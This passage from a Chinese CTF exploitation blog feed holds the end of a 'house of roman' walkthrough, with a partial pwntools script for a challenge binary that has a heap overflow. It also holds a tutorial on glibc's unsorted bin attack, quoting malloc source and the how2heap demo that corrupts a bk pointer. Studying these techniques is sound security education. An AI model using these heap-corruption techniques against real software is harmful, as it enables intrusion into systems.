src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409081949586.png" alt="image-20250409081949586"></p><ul><li>查看一下<code>prog_init</code>这个函数，这个函数主要就是执行输入输出初始化，然后我们还会发现<code>alarm(0x3C)</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409082058531.png" alt="image-20250409082058531"></p><ul><li>现在按照<code>增、删、改</code>的顺序查看程序运行逻辑。<ul><li>发现该程序会申请用户指定大小的堆块，指定<code>heaparray</code>这个位置的索引处</li><li>并且把堆块的大小存储在<code>heaparray[2*num]</code>这个位置，将<code>heaparray[2*num+1]</code>这个位置存储着<code>malloc()</code>返回的地址。</li></ul></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409082401075.png" alt="image-20250409082401075"></p><ul><li>这个函数会释放用户指定索引的堆块，并且释放堆块后会将堆块设置为<code>0</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409082901142.png" alt="image-20250409082901142"></p><ul><li>查看<code>edit()</code>函数：<ul><li>发现该函数能修改用户指定堆块，指定修改大小<strong>这里存在堆溢出的漏洞</strong></li><li>这时我们就还会<code>count</code>这个变量会限制我们修改的次数。</li></ul></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409083032414.png" alt="image-20250409083032414"></p><ul><li>我们现在来查看一下全局变量，发现全句变量就只有<code>heaparray</code>。</li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409084324413.png" alt="image-20250409084324413"></p><ul><li>并且发现<code>count</code>这个变量为<code>4</code></li></ul><p><img src="/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/image-20250409085023810.png" alt="image-20250409085023810"></p><h2 id="level_1分析2"><a class="markdownIt-Anchor" href="#level_1分析2"></a> level_1分析2</h2><ul><li>接下来我们先写一下<code>exp</code>的交互部分。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./npuctf_2020_bad_guy&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">10</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">10</span>,<span class="string">b&#x27;112&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="level_1分析3"><a class="markdownIt-Anchor" href="#level_1分析3"></a> level_1分析3</h2>]]></content>
    
    
    <summary type="html">前言：学完unsorted_bin_attack后看到这个组合技,发现可以先学争取学完.</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆unsorted_bin_attack2</title>
    <link href="http://iyheart.github.io/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/"/>
    <id>http://iyheart.github.io/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/</id>
    <published>2025-03-26T01:25:04.000Z</published>
    <updated>2025-03-27T14:28:35.675Z</updated>
    
    <content type="html"><![CDATA[<ul><li>之前的<code>unsorted_bin_attack</code>只是一个比较小的技巧，可以用这个技巧泄露<code>libc</code>的地址，而本篇文章的学习是，利用<code>unsorted_bin</code>的管理机制的一些缺陷，从而进行堆利用，进而<code>getshell</code></li><li>在学习<code>unsorted_bin_attack</code>时，我们就要先了解一下<code>unsorted_bin</code>这个链表的管理机制。</li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li>在学习过<code>house of lore</code>其实对<code>unsorted_bin_attack</code>的利用就简单非常多。虽然<code>house of lore</code>是针对<code>smallbin</code>的利用。但是确实有助于理解<code>unsorted_bin_attack</code>。</li><li>但是建议还是先从<code>unsorted_bin_attack</code>先入手，再去学习<code>house of lore</code>。</li></ul><h2 id="unsorted_bin运行机制"><a class="markdownIt-Anchor" href="#unsorted_bin运行机制"></a> unsorted_bin运行机制</h2><ul><li>我们之前已经了解了利用<code>unsortedbin</code>中的堆块泄露libc的地址。这个泄露的原理就是第一次被放入<code>unsortedbin</code>中的堆块，其<code>fd</code>指针、<code>bk</code>指针指向的是<code>main_arena+88</code>处（其他不同版本的<code>libc</code>偏移可能不同。）</li><li>而我们查看<code>main_arena+88</code>这个位置就会发现，<code>main_arena+88</code>这个位置其实是一个数组的开头。如下图所示，这个数组里面还有很多元素都还没有被使用的上。这个数组被称为<code>bins</code>。</li><li>而其实这个<code>bins</code>就是用来管理<code>unsortedbin</code>、<code>smallbins</code>、<code>largebins</code>这个链表的头结点，与图中管理<code>fastbin</code>链表的头结点数组<code>fastbinsY</code>相似。</li><li>但是<code>bins</code>这个头结点是双向循环链表，这点与<code>fastbin</code>单向链表就有所不同。所以我们的<code>bins[0]</code>就相当于<code>unsortedbin_fd</code>指针，<code>bins[1]</code>就相当于<code>unsortedbin_bk</code>指针。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327005755001.png" alt="image-20250327005755001"></p><ul><li>而我们图中的<code>main_arena</code>就相当于<code>glibc</code>中这个结构体的实例。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327010249397.png" alt="image-20250327010249397"></p><ul><li>接下来我们来简述一下<code>unsortedbin</code>的大致运行机制，之后再画图说明。<ul><li><code>unsortedbin</code>也是通过链表进行组织的，并且<code>unsortedbin</code>是一个双向循环链表的形式。</li><li>与<code>fastbin</code>链表不同的是<code>unsorted_bin</code>链表采用的是<code>FIFO</code>形式也就是（先进先出的形式）。</li><li>当有一个chunk被放入<code>unsorted_bin</code>这个链表中，这个<code>glibc</code>将使用头插法将该堆块，插入靠近<code>unsorted_bin</code>这个头结点的位置（指的是逻辑地址）</li><li>当有一个<code>chunk</code>要被取出时，会从最远离<code>unsorted_bin</code>的堆块开始取（指的是逻辑地址），然后会更新<code>unsorted_bin</code>中的<code>bk</code>指针。因此<code>unsorted bin</code>遍历堆块的时候使用的是<code>bk</code>指针。</li></ul></li><li>接下来画图描述，当没有堆块被放入<code>unsorted_bin</code>中时就会呈现出如下形式，即空空如也</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011438507.png" alt="image-20250327011438507"></p><ul><li>当有一个堆块被放入<code>unsorted_bin</code>中就会出现如下图所示的双向循环列表。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011527458.png" alt="image-20250327011527458"></p><ul><li>当有新的<code>chunk</code>被放入到<code>unsortedbin</code>中时，就会使用<code>头插法</code>。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011903095.png" alt="image-20250327011903095"></p><ul><li>当有堆块要被取出时就会先从<code>chunk1</code>这边取出，然后更新图中的双向循环链表。</li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327012012497.png" alt="image-20250327012012497"></p><h2 id="相关检查"><a class="markdownIt-Anchor" href="#相关检查"></a> 相关检查</h2><ul><li>以下图的<code>chunk1</code>和<code>chunk2</code>为例子，这时演示的是我们调用<code>malloc</code>申请一个堆块时，如果要从<code>unsorted_bin</code>中取堆块的情况。<ul><li>当我们要取出<code>chunk1</code>的时候，有一个<code>victim</code>会指向<code>chunk1</code>，还有一个<code>bck</code>指针会指向<code>chunk2</code>。</li><li>这时程序先会检查<code>victim</code>的<code>size</code>位，检查<code>size</code>是否小于等于<code>0x10</code>、<code>size</code>是否大于<code>av-&gt;system_mem</code>，经过判断后就会获取<code>victim</code>所指向堆块的<code>size</code>。<ul><li><code>__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</code></li><li>``__builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)`</li></ul></li><li>当<code>malloc</code>申请的堆块大小属于<code>small bin</code>范围中，并且<code>unsorted_bin</code>中的最后一个堆块是<code>unsortedbin</code>中的唯一<code>chunk</code>时，就会优先使用这个块，如果满足条件就会进行切割和解链操作。</li><li>当<code>malloc</code>申请的堆块大小超出<code>unsorted_bin</code>中的最后一个堆块时，则会将<code>victim</code>所指向的<code>chunk</code>根据<code>size</code>位，放入相应的<code>small_bins</code>中或者<code>large_bins</code>中</li><li>并且更新<code>双向循环链表</code>中的<code>unsorted_bin_bk</code>指针和<code>bck-&gt;fd</code>指针。<strong>我们对<code>unsorted_bin_attack</code>的利用重点就是在这里，如果我们可以修改<code>victim</code>的<code>bk</code>指针，修改完改指针后，我们再次调用<code>malloc</code>申请相同大小的堆块，这时<code>unsorted_bin</code>在更新双向循环链表的时候就会修改<code>bk</code>指针所指向的位置，从而将<code>某些值</code>（这个值我们无法控制）写入到我们想要的位置中</strong><ul><li><code>unsorted_chunks (av)-&gt;bk = bck;</code></li><li><code>bck-&gt;fd = unsorted_chunks (av);</code></li></ul></li><li><strong>猜测：由于<code>unsorted_bin</code>链表的管理与<code>smallbin_bin</code>链表的管理差不多，是不是能将<code>house of lore</code>的利用方式是使用在<code>unsorted_bin</code>中呢？</strong></li><li>如果之前的条件都不满足，意味着目前的<code>victim</code>不能满足用户的需求，需要根据其<code>size</code>放入<code>small bin</code>或<code>large bin</code>的链最后是<code>unlink</code>将<code>victim</code>彻底解链。</li></ul></li></ul><p><img src="/2025/03/26/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unsorted-bin-attack2/image-20250327011903095.png" alt="image-20250327011903095"></p><h2 id="相关源码"><a class="markdownIt-Anchor" href="#相关源码"></a> 相关源码</h2><details>    <summary>_int_malloc中关于unsorted_bin的源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></details><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>还是老样子，使用<code>how2heap</code>的例子，进行动态调试然后画图理解利用过程。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>将源码翻译一遍</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span 